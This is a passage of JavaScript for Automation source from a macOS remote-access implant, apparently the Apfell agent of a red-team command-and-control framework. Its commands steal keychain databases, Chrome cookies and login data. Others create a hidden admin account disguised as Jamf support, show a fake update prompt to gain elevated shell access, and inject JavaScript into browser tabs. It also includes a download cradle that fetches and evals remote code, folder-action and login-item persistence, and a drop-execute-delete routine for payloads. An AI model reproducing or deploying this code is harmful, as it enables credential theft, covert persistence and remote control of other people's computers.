        return {'user_output': error.toString(), "completed": true, "status": "error"};
    }
    try {
        let status = C2.download(task, loginDLPath);
        if(!status.hasOwnProperty("file_id")){
            return status;
        }
    }catch(error) {
        return {"user_output": error.toString(), "completed": true, "status": "error"};
    }

    let keypath = homedir + username + keychainpath;
    try{
        keyDL_status = C2.download(task, keypath);
    	  if(keyDL_status.hasOwnProperty("file_id")) {
              keyDL_status['user_output'] = "\nFinished Downloading KeychainDB, Cookies, and Login Data\n";
          }else{
    	      return keyDL_status;
          }
    }
    catch(error)  {
        return {'user_output': error.toString(), "completed": true, "status": "error"};
    }
    return keyDL_status;
};

exports.chrome_js = function(task, command, params){
    try{
        let split_params = JSON.parse(params);
        let window = split_params['window'];
        let tab = split_params['tab'];
        let jscript = split_params['javascript'];
        if(Application("Google Chrome").running()){
            let result = Application("Google Chrome").windows[window].tabs[tab].execute({javascript:jscript});
            if(result !== undefined){
                return {"user_output": String(result), "completed": true};
            }
            return {"user_output":"completed", "completed": true};
        }else{
            return {"user_output":"Chrome isn't running", "completed": true, "status": "error"};
        }
    }catch(error){
        let err = error.toString();
		if(err === "Error: An error occurred."){
		    err += " Apfell was denied access to Google Chrome (either by popup or prior deny).";
		}
		return {"user_output":err, "completed": true, "status": "error"};
    }
};

exports.add_user = function(task, command, params){
    try{
        // Add a user with dscl to the local machine
        let config = JSON.parse(params);
        let admin = true;
        let hidden = true;
        let username = ".jamf_support";
        let password = "P@55w0rd_Here";
        let realname = "Jamf Support User";
        let homedir = "/Users/";
        let uniqueid = 403;
        let primarygroupid = 80; //this is the admin group
        let usershell = "/bin/bash";
        let createprofile = false;
        let user = ""; //username of the user with sudo capability to do these commands
        let passwd = ""; //password of the user with sudo capability to do these commands
        if(config.hasOwnProperty("admin") && typeof config['admin'] == 'boolean'){ admin = config['admin']; }
        if(config.hasOwnProperty("hidden") && typeof config['hidden'] == 'boolean'){ hidden = config['hidden']; }
        if(config.hasOwnProperty("username") && config['username'] != ''){ username = config['username']; }
        if(config.hasOwnProperty("password") && config['password'] != ''){ password = config['password']; }
        if(config.hasOwnProperty("realname") && config['realname'] != ''){ realname = config['realname']; }
        if(config.hasOwnProperty("uniqueid") && config['uniqueid'] != -1){ uniqueid = config['uniqueid']; }
        else if(config.hasOwnProperty('uniqueid') && typeof config['uniqueid'] == 'string' && config['uniqueid'] != ''){ uniqueid = parseInt(config['uniqueid']); }
        if(config.hasOwnProperty("primarygroupid") && config['primarygroupid'] != -1){ primarygroupid = config['primarygroupid']; }
        else if(config.hasOwnProperty('primarygroupid') && typeof config['primarygroupid'] == 'string' && config['primarygroupid'] != ''){ primarygroupid = parseInt(config['primarygroupid']); }
        if(config.hasOwnProperty("usershell") && config['usershell'] != ''){ usershell = config['usershell']; }
        if(config.hasOwnProperty("createprofile") && typeof config['createprofile'] == "boolean"){ createprofile = config['createprofile']; }
        if(config.hasOwnProperty("homedir") && config['homedir'] != ''){ homedir = config['homedir']; }
        else{ homedir += username; }
        if(config.hasOwnProperty("user") && config['user'] != ''){ user = config['user']; }
        else{ return "User's name is required to do sudo commands"; }
        if(config.hasOwnProperty("passwd") && config['passwd'] != ''){ passwd = config['passwd']; }
        else{ return "User's password is required to do sudo commands"; }
        // now do our series of dscl commands to set up the account
        try{
            let cmd = "dscl . create /Users/" + username;
            currentApp.doShellScript(cmd, {administratorPrivileges:true, userName:user, password:passwd});
            if(hidden){
                cmd = "dscl . create /Users/" + username + " IsHidden 1";
                currentApp.doShellScript(cmd, {administratorPrivileges:true, userName:user, password:passwd});
            }
            cmd = "dscl . create /Users/" + username + " UniqueID " + uniqueid;
            currentApp.doShellScript(cmd, {administratorPrivileges:true, userName:user, password:passwd});
            cmd = "dscl . create /Users/" + username + " PrimaryGroupID " + primarygroupid;
            currentApp.doShellScript(cmd, {administratorPrivileges:true, userName:user, password:passwd});
            cmd = "dscl . create /Users/" + username + " NFSHomeDirectory \"" + homedir + "\"";
            currentApp.doShellScript(cmd, {administratorPrivileges:true, userName:user, password:passwd});
            cmd = "dscl . create /Users/" + username + " RealName \"" + realname + "\"";
            currentApp.doShellScript(cmd, {administratorPrivileges:true, userName:user, password:passwd});
            cmd = "dscl . create /Users/" + username + " UserShell " + usershell;
            currentApp.doShellScript(cmd, {administratorPrivileges:true, userName:user, password:passwd});
            if(admin){
                cmd = "dseditgroup -o edit -a " + username + " -t user admin";
                currentApp.doShellScript(cmd, {administratorPrivileges:true, userName:user, password:passwd});
            }
            cmd = "dscl . passwd /Users/" + username + " \"" + password + "\"";
            currentApp.doShellScript(cmd, {administratorPrivileges:true, userName:user, password:passwd});
            if(createprofile){
                cmd = "mkdir \"" + homedir + "\"";
                currentApp.doShellScript(cmd, {administratorPrivileges:true, userName:user, password:passwd});
                cmd = "cp -R \"/System/Library/User Template/English.lproj/\" \"" + homedir + "\"";
                currentApp.doShellScript(cmd, {administratorPrivileges:true, userName:user, password:passwd});
                cmd = "chown -R " + username + ":staff \"" + homedir + "\"";
                currentApp.doShellScript(cmd, {administratorPrivileges:true, userName:user, password:passwd});
            }
            return {"user_output": "Successfully ran the commands to create the user", "completed": true};
        }catch(error){
            return{"user_output": error.toString(), "status": "error", "completed": true};
        }
     }catch(error){
        return {"user_output": error.toString(), "status": "error", "completed": true};
     }

};

exports.get_config = function(task, command, params){
    let config = C2.getConfig();
    return {"user_output":config, "completed": true};
};

exports.system_info = function(task, command, params){
    try{
        return {"user_output":JSON.stringify(currentApp.systemInfo(), null, 2), "completed": true};
    }catch(error){
        return {"user_output":error.toString(), "completed": true, "status": "error"};
    }
};

exports.ls = function(task, command, params){
    ObjC.import('Foundation');
    let output = {};
    try {
        let command_params = JSON.parse(params);
        let fileManager = $.NSFileManager.defaultManager;
        let error = Ref();
        let path = command_params['path'];
        if (path === "" || path === ".") {
            path = fileManager.currentDirectoryPath.js;
            if (path === undefined || path === "") {
                return {
                    "user_output": "Failed to get current working directory",
                    "completed": true,
                    "status": "error"
                };
            }
        }
        if (path[0] === '"' || path[0] === "'") {
            path = path.substring(1, path.length - 1);
        }
        if(path[0] === '~'){
            path = $(path).stringByExpandingTildeInPath.js;
        }
        output['host'] = ObjC.unwrap(apfell.procInfo.hostName);
        output['update_deleted'] = true;
        let attributes = ObjC.deepUnwrap(fileManager.attributesOfItemAtPathError($(path), error));
        let time_attributes = ObjC.unwrap(fileManager.attributesOfItemAtPathError($(path), error));
        if (attributes !== undefined) {
            output['is_file'] = true;
            output['files'] = [];
            if (attributes.hasOwnProperty('NSFileType') && attributes['NSFileType'] === "NSFileTypeDirectory") {
                let error = Ref();
                output['is_file'] = false;
                let files = ObjC.deepUnwrap(fileManager.contentsOfDirectoryAtPathError($(path), error));
                if (files !== undefined) {
                    let files_data = [];
                    output['success'] = true;
                    let sub_files = files;
                    if (path[path.length - 1] !== "/") {
                        path = path + "/";
                    }
                    for (let i = 0; i < sub_files.length; i++) {
                        let attr = ObjC.deepUnwrap(fileManager.attributesOfItemAtPathError($(path + sub_files[i]), error));
                        let time_attr = ObjC.unwrap(fileManager.attributesOfItemAtPathError($(path + sub_files[i]), error));
                        let file_add = {};
                        file_add['name'] = sub_files[i];
                        file_add['is_file'] = attr['NSFileType'] !== "NSFileTypeDirectory";
                        let plistPerms = ObjC.unwrap(fileManager.attributesOfItemAtPathError($(path + sub_files[i]), $()));
                        if(plistPerms['NSFileExtendedAttributes'] !== undefined){
                            let extended = {};
                            let perms = plistPerms['NSFileExtendedAttributes'].js;
                            for(let j in perms){
                                extended[j] = perms[j].base64EncodedStringWithOptions(0).js;
                            }
                            file_add['permissions'] = extended;
                        }else{
                            file_add['permissions'] = {};
                        }
                        file_add['size'] = attr['NSFileSize'];
                        let nsposix = attr['NSFilePosixPermissions'];
                        // we need to fix this mess to actually be real permission bits that make sense
                        file_add['permissions']['posix'] = ((nsposix >> 6) & 0x7).toString() + ((nsposix >> 3) & 0x7).toString() + (nsposix & 0x7).toString();
                        file_add['permissions']['owner'] = attr['NSFileOwnerAccountName'] + "(" + attr['NSFileOwnerAccountID'] + ")";
                        file_add['permissions']['group'] = attr['NSFileGroupOwnerAccountName'] + "(" + attr['NSFileGroupOwnerAccountID'] + ")";
                        file_add['permissions']['hidden'] = attr['NSFileExtensionAttribute'] === true;
                        file_add['permissions']['create_time'] = Math.trunc(time_attr['NSFileCreationDate'].timeIntervalSince1970 * 1000);
                        file_add['modify_time'] = Math.trunc(time_attr['NSFileModificationDate'].timeIntervalSince1970 * 1000);
                        file_add['access_time'] = "";
                        files_data.push(file_add);
                    }
                    output['files'] = files_data;
                }
                else{
                    output['success'] = false;
                }
            }
            let nsposix = attributes['NSFilePosixPermissions'];
            let components =  ObjC.deepUnwrap( fileManager.componentsToDisplayForPath(path) ).slice(1);
            if( components.length > 0 && components[0] === "Macintosh HD"){
                components.pop();
            }
            // say components = "etc, krb5.keytab"
            // check all components to see if they're symlinks
            let parent_path = "/";
            for(let p = 0; p < components.length; p++){
                let resolvedSymLink = fileManager.destinationOfSymbolicLinkAtPathError( $( parent_path + components[p] ), $.nil ).js;
                if(resolvedSymLink){
                    parent_path = parent_path + resolvedSymLink + "/";
                }else{
                    parent_path = parent_path + components[p] + "/";
                }
            }
            output['name'] = fileManager.displayNameAtPath(parent_path).js;
            output['parent_path'] = parent_path.slice(0, -(output["name"].length + 1));

            if(output['name'] === "Macintosh HD"){output['name'] = "/";}
            if(output['name'] === output['parent_path']){output['parent_path'] = "";}
            output['size'] = attributes['NSFileSize'];
            output['access_time'] = "";
            output['modify_time'] = Math.trunc(time_attributes['NSFileModificationDate'].timeIntervalSince1970 * 1000);
            if(attributes['NSFileExtendedAttributes'] !== undefined){
                let extended = {};
                let perms = attributes['NSFileExtendedAttributes'].js;
                for(let j in perms){
                    extended[j] = perms[j].base64EncodedStringWithOptions(0).js;
                }
                output['permissions'] = extended;
            }else{
                output['permissions'] = {};
            }
            output['permissions']['create_time'] = Math.trunc(time_attributes['NSFileCreationDate'].timeIntervalSince1970 * 1000);
            output['permissions']['posix'] =((nsposix >> 6) & 0x7).toString() + ((nsposix >> 3) & 0x7).toString() + (nsposix & 0x7).toString();
            output['permissions']['owner'] = attributes['NSFileOwnerAccountName'] + "(" + attributes['NSFileOwnerAccountID'] + ")";
            output['permissions']['group'] = attributes['NSFileGroupOwnerAccountName'] + "(" + attributes['NSFileGroupOwnerAccountID'] + ")";
            output['permissions']['hidden'] = attributes['NSFileExtensionHidden'] === true;
            if(command_params['file_browser'] === "true"){
                return {"file_browser": output, "completed": true, "user_output": "added data to file browser"};
            }else{
                return {"file_browser": output, "completed": true, "user_output": JSON.stringify(output, null, 6)};
            }
        }
        else{
            return {
                "user_output": "Failed to get attributes of file. File doesn't exist or you don't have permission to read it",
                "completed": true,
                "status": "error"
            };
        }

    }catch(error){
        return {
            "user_output": "Error: " + error.toString(),
            "completed": true,
            "status": "error"
        };
    }
};

exports.spawn_download_cradle = function(task, command, params){
    try{
        let config = JSON.parse(params);
        if(!config.hasOwnProperty('url')){return {"user_output": "missing url parameter: 'a URL address where the jxa code is hosted'", "completed": true, "status": "error"};}
        let full_url = config['url'];
        let path = "/usr/bin/osascript";
        let args = ['-l','JavaScript','-e'];
        let command = "eval(ObjC.unwrap($.NSString.alloc.initWithDataEncoding($.NSData.dataWithContentsOfURL($.NSURL.URLWithString(";
        command = command + "'" + full_url + "')),$.NSUTF8StringEncoding)));";
        args.push(command);
        args.push("&");
        try{
            let pipe = $.NSPipe.pipe;
            let file = pipe.fileHandleForReading;  // NSFileHandle
            let task = $.NSTask.alloc.init;
            task.launchPath = path;
            task.arguments = args;
            task.standardOutput = pipe;
            task.standardError = pipe;
            task.launch;
        }
        catch(error){
            return {"user_output":error.toString(), "completed": true, "status": "error"};
        }
        return {"user_output":"Process spawned", "completed": true};
    }catch(error){
        return {"user_output":error.toString(), "completed": true, "status": "error"};
    }
};

exports.jsimport_call = function(task, command, params){
    try{
        let command_params = JSON.parse(params);
        if(!command_params.hasOwnProperty('command')){ return {"user_output": "missing command parameter", "status": "error", "completed": true};}
        let output = ObjC.deepUnwrap(eval(jsimport + "\n " + command_params['command']));
        if(output === "" || output === undefined){
            return {"user_output":"No command output", "completed": true};
        }
        if(output === true){
            return {"user_output":"True", "completed": true};
        }
        if(output === false){
            return{"user_output":"False", "completed": true};
        }
        if(typeof(output) != "string"){
            output = String(output);
        }
        return {"user_output":output, "completed": true};
    }
    catch(error){
        return {"user_output":error.toString(), "completed": true, "status": "error"};
    }
};

exports.shell_elevated = function(task, command, params){
    try{
        let response = "";
        let pieces = [];
        let cmd = "";
        if(params.length > 0){ pieces = JSON.parse(params); }
        else{ pieces = []; }
        if(pieces.hasOwnProperty('command') && pieces['command'] !== ""){
            if(pieces['command'][command.length -1] === "&"){
                cmd = pieces['command'] + "> /dev/null &";
            }else{
                cmd = pieces['command'];
            }
        }
        else{
            return {"user_output": "missing command", "completed": true, "status": "error"};
        }
        let use_creds = false;
        let prompt = "An application needs permission to update";
        if(pieces.hasOwnProperty('prompt') && pieces['prompt'] !== ""){
            prompt = pieces['prompt'];
            use_creds = false;
        }else{
            use_creds = true;
        }
        if(!use_creds) {
            try {
                response = currentApp.doShellScript(cmd, {administratorPrivileges: true, withPrompt: prompt});
            } catch (error) {
                // shell output uses \r instead of \n or \r\n to line endings, fix this nonsense
                response = error.toString().replace(/\r/g, "\n");
                return {"user_output": response, "completed": true, "status": "error"};
            }
        }
        else{
            let userName = apfell.user;
            let password = "";
            if(pieces.hasOwnProperty('user') && pieces['user'] !== ""){ userName = pieces['user']; }
            if(pieces.hasOwnProperty('credential')){ password = pieces['credential']; }
            try{
                response = currentApp.doShellScript(cmd, {administratorPrivileges:true, userName:userName, password:password});
            }
            catch(error){
                // shell output uses \r instead of \n or \r\n to line endings, fix this nonsense
                response = error.toString().replace(/\r/g, "\n");
                return {"user_output":response, "completed": true, "status": "error"};
            }
        }
        // shell output uses \r instead of \n or \r\n to line endings, fix this nonsense
        response = response.replace(/\r/g, "\n");
        return {"user_output":response, "completed": true};
    }catch(error){
        return {"user_output":error.toString(), "completed": true, "status": "error"};
    }
};

exports.persist_loginitem_allusers = function(task, command, params){
    ObjC.import('CoreServices');
    ObjC.import('Security');
    ObjC.import('SystemConfiguration');
    let args = JSON.parse(params);
    // Obtain authorization for the global login item list
    // Set the item as hidden: https://github.com/pkamb/OpenAtLogin/blob/master/OpenAtLogin.m#L35
    let auth;
    let result = $.AuthorizationCreate($.nil, $.nil, $.kAuthorizationDefaults, Ref(auth));

    if (result === 0) {
        let temp = $.CFURLCreateFromFileSystemRepresentation($.kCFAllocatorDefault, args['path'], args['path'].length, false);
        let items = $.LSSharedFileListCreate($.kCFAllocatorDefault, $.kLSSharedFileListGlobalLoginItems, $.nil);
        $.LSSharedFileListSetAuthorization(items, auth);
        let cfName = $.CFStringCreateWithCString($.nil, args['name'], $.kCFStringEncodingASCII);
        let itemRef = $.LSSharedFileListInsertItemURL(items, $.kLSSharedFileListItemLast, cfName, $.nil, temp, $.nil, $.nil);
        return {"user_output": "LoginItem installation successful", "completed": true};
    } else {
        return {"user_output": `LoginItem installation failed: AuthorizationCreate returned ${result}`, "completed": true};
    }

};
exports.current_user = function(task, command, params){
    try{
        let method = "api";
        if(params.length > 0){
            let data = JSON.parse(params);
            if(data.hasOwnProperty('method') && data['method'] !== ""){
                method = data['method'];
            }
        }
        if(method === "jxa"){
            let user = Application("System Events").currentUser;
            let info = "Name: " + user.name() +
            "\nFullName: " + user.fullName() +
            "\nhomeDirectory: " + user.homeDirectory() +
            "\npicturePath: " + user.picturePath();
            return {"user_output":info, "completed": true};
        }
        else if(method === "api"){
            let output = "\nUserName: " + $.NSUserName().js +
            "\nFull UserName: " + $.NSFullUserName().js +
            "\nHome Directory: " + $.NSHomeDirectory().js;
            return {"user_output":output, "completed": true};
        }
        else{
            return {"user_output":"Method not supported", "completed": true, "status": "error"};
        }
    }catch(error){
        return {"user_output":error.toString(), "completed": true, "status": "error"};
    }
};

exports.clipboard = function(task, command, params){
    ObjC.import('AppKit');
    let parsed_params;
    try{
        parsed_params = JSON.parse(params);
    }catch(error){
        return {"user_output": "Failed to parse parameters", "status": "error", "completed": true};
    }
    if(parsed_params.hasOwnProperty("data") && parsed_params['data'].length > 0){
        // Try setting the clipboard to whatever is in params
        try{
            $.NSPasteboard.generalPasteboard.clearContents;
            $.NSPasteboard.generalPasteboard.setStringForType($(parsed_params['data']), $.NSPasteboardTypeString);
            return {"user_output": "Successfully set the clipboard", "completed": true};
        }
        catch(error){
            return {"user_output":error.toString(), "completed": true, "status": "error"};
        }
    }
    else{
        //try just reading the clipboard data and returning it
        if(parsed_params['read'].length === 0){
            parsed_params['read'].push("public.utf8-plain-text");
        }
        try{
            let pb = $.NSPasteboard.generalPasteboard;
            let types = pb.types.js;
            let clipboard = {};
            for(let i = 0; i < types.length; i++){
                let typejs = types[i].js;
                clipboard[typejs] = pb.dataForType(types[i]);
                console.log(clipboard[typejs].js)
                console.log(clipboard[typejs].js !== undefined, parsed_params["read"], typejs, parsed_params["read"].includes(typejs));
                if(clipboard[typejs].js !== undefined && (parsed_params['read'].includes(typejs) || parsed_params['read'][0] === "*")){
                    clipboard[typejs] = clipboard[typejs].base64EncodedStringWithOptions(0).js;
                }else{
                    clipboard[typejs] = "";
                }
            }
            return {"user_output": JSON.stringify(clipboard, null, 4), "completed": true};
        }
        catch(error){
            return {"user_output":error.toString(), "completed": true, "status": "error"};
        }
    }
};

exports.code_signatures = function(task, command, params){
    ObjC.import("Security");
	let staticCode = Ref();
	try{
	    let binpath = JSON.parse(params)["path"];
	    if(binpath === undefined || binpath === null){
	        return {"user_output": "Missing Path to examine", "completed": true, "status": "error"};
        }
        let path = $.CFURLCreateFromFileSystemRepresentation($.kCFAllocatorDefault, binpath, binpath.length, true);
        $.SecStaticCodeCreateWithPath(path, 0, staticCode);
        let codeInfo = Ref();
        $.SecCodeCopySigningInformation(staticCode[0], 0x7F, codeInfo);
        ObjC.bindFunction('CFMakeCollectable', ['id', ['void *'] ]);
        let codeInfo_c = $.CFMakeCollectable(codeInfo[0]);
        let code_json = ObjC.deepUnwrap(codeInfo_c);
        if(code_json === undefined){
            return {"user_output": "Failed to find specified path", "completed": true, "status": "error"};
        }
        if(code_json.hasOwnProperty("flags")){
            let flag_details = [];
            if( code_json["flags"] & 0x000001 ){flag_details.push({"0x000001": "kSecCodeSignatureHost - May host guest code"})}
            if( code_json["flags"] & 0x000002 ){flag_details.push({"0x000002": "kSecCodeSignatureAdhoc - The code has been sealed without a signing identity"})}
            if( code_json["flags"] & 0x000100 ){flag_details.push({"0x000100": "kSecCodeSignatureForceHard - The code prefers to be denied access to a resource if gaining such access would cause its invalidation"})}
            if( code_json["flags"] & 0x000200 ){flag_details.push({"0x000200": "kSecCodeSignatureForceKill - The code wishes to be terminated if it is ever invalidated"})}
            if( code_json["flags"] & 0x000400 ){flag_details.push({"0x000400": "kSecCodeSignatureForceExpiration - Code signatures made by expired certificates be rejected"})}
            if( code_json["flags"] & 0x000800 ){flag_details.push({"0x000800": "kSecCodeSignatureRestrict - Restrict dyld loading"})}
            if( code_json["flags"] & 0x001000 ){flag_details.push({"0x001000": "kSecCodeSignatureEnforcement - Enforce code signing"})}
            if( code_json["flags"] & 0x002000 ){flag_details.push({"0x002000": "kSecCodeSignatureLibraryValidation - Require library validation"})}
            if( code_json["flags"] & 0x010000 ){flag_details.push({"0x010000": "kSecCodeSignatureRuntime - Apply runtime hardening policies as required by the hardened runtime version"})}
            code_json["flag_details"] = flag_details;
            code_json["flags"] = "0x" + code_json["flags"].toString(16);
        }
        return {"user_output":JSON.stringify(code_json, null, 2), "completed": true};
    }catch(error){
        return {"user_output":error.toString(), "completed": true, "status": "error"};
    }
};

exports.ifconfig = function(task, command, params){
    return {"user_output": JSON.stringify(ObjC.deepUnwrap($.NSHost.currentHost.addresses), null, 2), "completed": true};
};


exports.persist_folderaction = function(task, command, params){
    try{
    	// ======= Get params ========
    	let json_params = JSON.parse(params);
    	let folder = json_params['folder'];
    	let script_path = json_params['script_path'];
    	let url = json_params['url'];
    	let code = json_params['code'];
    	let lang = json_params['language'];
    	let code1 = "var app = Application.currentApplication();\n" +
                    "app.includeStandardAdditions = true;\n" +
                    "app.doShellScript(\" osascript -l JavaScript -e \\\"eval(ObjC.unwrap($.NSString.alloc.initWithDataEncoding($.NSData.dataWithContentsOfURL($.NSURL.URLWithString('";
		let code2 = "')),$.NSUTF8StringEncoding)));\\\" &> /dev/null &\");";
		let output = "";
    	// ======== Compile and write script to file ==========
    	ObjC.import('OSAKit');
    	let mylang = "";
    	let myscript = "";
    	if(code !== ""){
    		mylang = $.OSALanguage.languageForName(lang);
    		myscript = $.OSAScript.alloc.initWithSourceLanguage($(code),mylang);
    	}else{
    		mylang = $.OSALanguage.languageForName("JavaScript");
    		myscript = $.OSAScript.alloc.initWithSourceLanguage($(code1 + url + code2),mylang);
    	}

		myscript.compileAndReturnError($());
		let data = myscript.compiledDataForTypeUsingStorageOptionsError("osas", 0x00000003, $());
		data.writeToFileAtomically(script_path, true);
		// ======= Handle the folder action persistence =======
        let se = Application("System Events");
		se.folderActionsEnabled = true;
		let fa_exists = false;
		let script_exists = false;
		let myScript = se.Script({name: script_path.split("/").pop(), posixPath: script_path});
		let fa = se.FolderAction({name: folder.split("/").pop(), path: folder});
		// first check to see if there's a folder action for the path we're looking at
		for(let i = 0; i < se.folderActions.length; i++){
			if(se.folderActions[i].path() === folder){
				// if our folder already has folder actions, just take the reference for later
				fa = se.folderActions[i];
				fa_exists = true;
				output += "Folder already has folder actions\n";
				break;
			}
		}
		// if the folder action doesn't exist, add it
		if(fa_exists === false){
			se.folderActions.push(fa);
		}
		// Check to see if this script already exists on this folder
		for(let i = 0; i < fa.scripts.length; i++){
			if(fa.scripts[i].posixPath() ===  script_path){
				script_exists = true;
				output += "Script already assigned to this folder\n";
				break;
			}
		}
		if(script_exists === false){
			fa.scripts.push(myScript);
		}
		output += "Folder Action established";
		return {"user_output":output, "completed": true, "artifacts": [{"base_artifact":"File Create", "artifact": script_path}]};
    }catch(error){
        return {"user_output":error.toString(), "completed": true, "status": "error"};
    }
};

exports.jscript = function(task, command, params){
	//simply eval a javascript string and return the response
	let response = "";
	try{
		let command_params = JSON.parse(params);
		if(!command_params.hasOwnProperty("command")){ return {"user_output": "Missing command parameter", "status": "error", "completed": true};}
		response = ObjC.deepUnwrap(eval(command_params['command']));
	}
	catch(error){
		return {"user_output":error.toString(), "completed": true, "status": "error"};
	}
	if(response === undefined || response === ""){
	    response = "No Command Output";
	}
	if(response === true){
	    response = "True";
	}
	if(response === false){
	    response = "False";
	}
	if(typeof(response) != "string"){
	    response = String(response);
	}
	return {"user_output":response, "completed": true};
};

exports.hostname = function(task, command, params){
	let output = {};
	output['localized'] = ObjC.deepUnwrap($.NSHost.currentHost.localizedName);
	output['names'] = ObjC.deepUnwrap($.NSHost.currentHost.names);
	let fileManager = $.NSFileManager.defaultManager;
	if(fileManager.fileExistsAtPath("/Library/Preferences/SystemConfiguration/com.apple.smb.server.plist")){
		let dict = $.NSMutableDictionary.alloc.initWithContentsOfFile("/Library/Preferences/SystemConfiguration/com.apple.smb.server.plist");
		let contents = ObjC.deepUnwrap(dict);
		output['Local Kerberos Realm'] = contents['LocalKerberosRealm'];
		output['NETBIOS Name'] = contents['NetBIOSName'];
		output['Server Description'] = contents['ServerDescription'];
	}
	return {"user_output": JSON.stringify(output, null, 2), "completed": true};
};

    
exports.run = function(task, command, params){
	//launch a program and args via ObjC bridge without doShellScript and return response
    let response = "";
	try{
        let pieces = JSON.parse(params);
        let path = pieces['path'];
        //console.log(path);
        let args = pieces['args'];
        let pipe = $.NSPipe.pipe;
		let file = pipe.fileHandleForReading;  // NSFileHandle
		let task = $.NSTask.alloc.init;
		task.launchPath = path; //'/bin/ps'
		task.arguments = args; //['ax']
		task.standardOutput = pipe;  // if not specified, literally writes to file handles 1 and 2
		task.standardError = pipe;
		//console.log("about to launch");
		task.launch; // Run the command 'ps ax'
		//console.log("launched");
		if(args[args.length - 1] !== "&"){
		    //if we aren't tasking this to run in the background, then try to read the output from the program
		    //  this will hang our main program though for now
            let data = file.readDataToEndOfFile;  // NSData, potential to hang here?
            file.closeFile;
            response = $.NSString.alloc.initWithDataEncoding(data, $.NSUTF8StringEncoding).js;
        }
        else{
            response = "launched program";
        }
    }catch(error){
        return {"user_output":error.toString(), "completed": true, "status": "error"};
    }
	return {"user_output":response, "completed": true};
};

exports.cd = function(task, command, params){
    try{
        let command_params = JSON.parse(params);
        if(!command_params.hasOwnProperty('path')){return {"user_output": "Missing path parameter", "completed": true, "status": "error"}}
        let fileManager = $.NSFileManager.defaultManager;
        let success = fileManager.changeCurrentDirectoryPath(command_params['path']);
        if(success){
            return {"user_output": "New cwd: " + fileManager.currentDirectoryPath.js, "completed": true};
        }else{
            return {"user_output": "Failed to change directory", "completed": true, "status": "error"};
        }
    }catch(error){
        return {"user_output": error.toString(), "completed": true, "status": "error"};
    }
};

exports.upload = function(task, command, params){
    try{
        let config = JSON.parse(params);
        let full_path  = config['remote_path'];
        let data = "Can't find 'file' or 'file_id' with non-blank values";
        let file_id = "";
        if(config.hasOwnProperty('file') && config['file'] !== ""){
            data = C2.upload(task, config['file'], "");
            file_id = config['file']
        }
        if(typeof data === "string"){
            return {"user_output":String(data), "completed": true, "status": "error"};
        }
        else{
            data = write_data_to_file(data, full_path);
            try{
	            let fm = $.NSFileManager.defaultManager;
	            let pieces = ObjC.deepUnwrap(fm.componentsToDisplayForPath(full_path));
	            if(pieces === undefined){
	                return {'status': 'error', 'user_output': String(data), 'completed': true};
                }
	            full_path = "/" + pieces.slice(1).join("/");
	        }catch(error){
	            return {'status': 'error', 'user_output': error.toString(), 'completed': true};
	        }
            return {"user_output":String(data), "completed": true, 'full_path': full_path, "file_id": file_id,
            "artifacts": [{"base_artifact": "File Create", "artifact": full_path}]};
        }
    }catch(error){
        return {"user_output":error.toString(), "completed": true, "status": "error"};
    }
};

exports.rm = function(task, command, params){
    try{
        let command_params = JSON.parse(params);
        let path = command_params['path'];
        let fileManager = $.NSFileManager.defaultManager;
        if(path[0] === '"'){
            path = path.substring(1, path.length-1);
        }
        let error = Ref();
        fileManager.removeItemAtPathError($(path), error);
        return {"user_output":"Removed file", "completed": true, "removed_files": [{"path": path, "host": ""}]};
    }catch(error){
        return {"user_output":error.toString(), "completed": true, "status": "error"};
    }
};

exports.spawn_drop_and_execute = function(task, command, params){
    let artifacts = [];
    try{
        let config = JSON.parse(params);
        //full_url = C2.baseurl + "api/v1.0/payloads/get/" + split_params[3];
        let m = [...Array(Number(10))].map(i=>(~~(Math.random()*36)).toString(36)).join('');
        let temp_file = "/tmp/" + m;
        let file = C2.upload(task, config['template'], temp_file);

        let path = "/usr/bin/osascript";
        let result = write_data_to_file(file, temp_file);
        if(result !== "file written"){return {"user_output": result, "completed": true, "status": 'error'};}
        else{artifacts.push({"base_artifact": "File Create", "artifact": temp_file});}
        let args = ['-l','JavaScript', temp_file, '&'];
        try{
            let pipe = $.NSPipe.pipe;
            let file = pipe.fileHandleForReading;  // NSFileHandle
            let task = $.NSTask.alloc.init;
            task.launchPath = path;
            task.arguments = args;
            task.standardOutput = pipe;
            task.standardError = pipe;
            task.launch;
            artifacts.push({"base_artifact": "Process Create", "artifact": "/usr/bin/osascript " + args.join(" ")});
        }
        catch(error){
            return {"user_output":error.toString(), "completed": true, "status": "error", "artifacts": artifacts};
        }
        //give the system time to actually execute the file before we delete it
        $.NSThread.sleepForTimeInterval(3);
        let fileManager = $.NSFileManager.defaultManager;
        fileManager.removeItemAtPathError($(temp_file), $());
        return {"user_output": "Created temp file: " + temp_file + ", started process and removed file", "completed": true, "artifacts": artifacts};
    }catch(error){
        return {"user_output":error.toString(), "completed": true, "status": "error", "artifacts": artifacts};
    }
};

    
exports.security_info = function(task, command, params){
    try{
        let secObj = Application("System Events").securityPreferences();
        let info = "automaticLogin: " + secObj.automaticLogin() +
        "\nlogOutWhenInactive: " + secObj.logOutWhenInactive() +
        "\nlogOutWhenInactiveInterval: " + secObj.logOutWhenInactiveInterval() +
        "\nrequirePasswordToUnlock: " + secObj.requirePasswordToUnlock() +
        "\nrequirePasswordToWake: " + secObj.requirePasswordToWake();
        //"\nsecureVirtualMemory: " + secObj.secureVirtualMemory(); //might need to be in an elevated context
        return {"user_output":info, "completed": true};
    }catch(error){
        return {"user_output":error.toString(), "completed": true, "status": "error"};
    }
};

exports.chrome_tabs = function(task, command, params){
	let tabs = {};
	try{
		let ch = Application("Google Chrome");
		if(ch.running()){
            for (let i = 0; i < ch.windows.length; i++){
                let win = ch.windows[i];
                tabs["Window " + i] = {};
                for (let j = 0; j < win.tabs.length; j++){
                    let tab = win.tabs[j];
                    tabs["Window " + i]["Tab " + j] = {"title": tab.title(), "url": tab.url()};
                }
            }
        }else{
            return {"user_output": "Chrome is not running", "completed": true, "status": "error"};
        }
	}catch(error){
		let err = error.toString();
		if(err === "Error: An error occurred."){
		    err += " Apfell was denied access to Google Chrome (either by popup or prior deny).";
		}
		return {"user_output":err, "completed": true, "status": "error"};
	}
	return {"user_output": JSON.stringify(tabs, null, 2), "completed": true};
};

exports.load = function(task, command, params){
    //base64 decode the params and pass it to the default_load command
    //  params should be {"cmds": "cmd1 cmd2 cmd3", "file_id": #}
    try{
        let parsed_params = JSON.parse(params);
        let code = C2.upload(task, parsed_params['file_id'], "");
        if(typeof code === "string"){
            return {"user_output":String(code), "completed": true, "status": "error"};
            //something failed, we should have NSData type back
        }
        let new_dict = default_load(base64_decode(code));
        commands_dict = Object.assign({}, commands_dict, new_dict);
        // update the config with our new information
